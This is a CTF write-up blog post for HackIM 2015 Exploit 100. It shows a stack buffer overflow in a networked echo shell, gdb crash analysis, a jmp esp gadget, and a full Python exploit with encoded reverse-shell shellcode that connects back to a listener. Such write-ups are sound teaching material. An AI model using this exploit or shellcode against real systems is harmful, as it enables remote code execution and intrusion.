---
layout: post
title: "HackIM 2015 Exploit 100"
date: 2015-01-11 18:04:11 -0500
author: [superkojiman]
comments: true
categories: [hackim]
---

### Solved by superkojiman

A relatively straightforward buffer overflow. The shell asks for a command, and that command is "echo" followed by our input. Any unrecognized commands returns an error: 

```
# nc localhost 9000
fash$ help
Error - unsupported command

# nc localhost 9000
fash$ echo AAAAA
echo: AAAAA
```
We can overflow return pointer in function 0x8048908 when sprintf() is used to copy our input to a buffer. We need to send 118 bytes of junk, followed by the overwrite to the saved return pointer: 

```
# nc localhost 9000
fash$ echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
```

No message is returned to us since we've crashed it. We can examine the dumped core:

```
# gdb -q -c core
[New LWP 9398]
Core was generated by `./srv'.
Program terminated with signal 11, Segmentation fault.
#0  0x42424242 in ?? ()
```

Return pointer has been overwritten. We don't control any of the registers, but esp contains our string of "C"s:

```
gdb-peda$ x/40wx $esp
0xbfffd2a0: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfffd2b0: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfffd2c0: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfffd2d0: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfffd2e0: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfffd2f0: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfffd300: 0x43434343  0x00000a0a  0x00000000  0x00000000
0xbfffd310: 0x00000000  0x00000000  0x00000000  0x00000000
0xbfffd320: 0x00000000  0x00000000  0x00000000  0x00000000
0xbfffd330: 0x00000000  0x00000000  0x00000000  0x00000000
```

Using msfelfscan, we can find a "jmp esp" instruction:

```
# msfelfscan -j esp srv
[srv]
0x080488b0 jmp esp
```

The binary has no NX or canary so we can execute our shellcode on the stack. Here's the final exploit that uses a reverse shell to connect back to us: 

```python
import socket, struct

ip = "54.163.248.69"
port = 9000


# [*] x86/shikata_ga_nai succeeded with size 95 (iteration=1)
shellcode = (
"\x90"*20 +

"\xbe\x6e\x3c\xa7\x19\xd9\xc0\xd9\x74\x24\xf4\x5b\x29\xc9" +
"\xb1\x12\x83\xc3\x04\x31\x73\x0e\x03\x1d\x32\x45\xec\xd0" +
"\x91\x7e\xec\x41\x65\xd2\x99\x67\xe0\x35\xed\x01\x3f\x35" +
"\x9d\x94\x0f\x09\x6f\xa6\x39\x0f\x96\xce\xd1\x6c\x90\x29" +
"\x4a\x71\x61\x34\x31\xfc\x80\x86\x23\xaf\x13\xb5\x18\x4c" +
"\x1d\xd8\x92\xd3\x4f\x72\x02\xfb\x1c\xea\x34\x2c\x81\x83" +
"\xaa\xbb\xa6\x01\x60\x35\xc9\x15\x8d\x88\x8a"
)

buf =  "A"*118
buf += struct.pack("<I", 0x080488b0)    # ret addr: jmp esp
buf += shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

print s.recv(1024)
s.send("echo " + buf)
print s.recv(1024)
```

Running the exploit gives us a shell on the target: 

```text
root@vulnhub:~# nc -lvp 443
listening on [any] 443 ...
connect to [104.131.248.39] from ec2-54-163-248-69.compute-1.amazonaws.com [54.163.248.69] 56033
id
/bin//sh: 1: id: not found
```

We have a weird shell, but we can read files using bash: 

```
echo *
bin etc flag.txt lib srv
```

flag.txt contains our flag. Let's read it:

```
while read line; do echo $line; done < flag.txt
aleph1-to-the-rescue++
```

The flag is **aleph1-to-the-rescue++**

